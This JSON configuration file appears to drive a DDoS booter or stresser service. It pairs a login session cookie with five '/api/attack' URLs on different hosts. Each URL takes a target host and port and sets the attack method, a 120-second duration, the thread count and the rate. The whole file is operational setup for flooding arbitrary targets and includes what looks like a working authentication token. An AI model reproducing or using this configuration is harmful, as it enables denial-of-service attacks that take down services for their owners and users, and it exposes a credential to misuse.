{
    "cookie": "webappio-login=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxNjc2OSJ9.1Zoe3tDOz3OazE3UFwBKwsUAYksM3dhvNkxwfEDaP9Y;",
    "requests": [
        { "id": 1, "url": "https://blissful-eloquent-wilson.cidemo.co/api/attack?key=negan&port={port}&modul=full&method=attack&time=120&threads=10&rate=999&host={host}" },
        { "id": 2, "url": "https://angry-determined-galois-2.cidemo.co/api/attack?key=negan&port={port}&modul=full&method=attack&time=120&threads=10&rate=999&host={host}" },
        { "id": 3, "url": "https://cool-brave-austin-3.cidemo.co/api/attack?key=negan&port={port}&modul=full&method=attack&time=120&threads=10&rate=999&host={host}" },
        { "id": 4, "url": "https://keen-laughing-black-4.cidemo.co/api/attack?key=negan&port={port}&modul=full&method=attack&time=120&threads=10&rate=999&host={host}" },
        { "id": 5, "url": "https://xenodochial-distracted-rosalind-5.cidemo.co/api/attack?key=negan&port={port}&modul=full&method=attack&time=120&threads=10&rate=999&host={host}" }
    ]
}
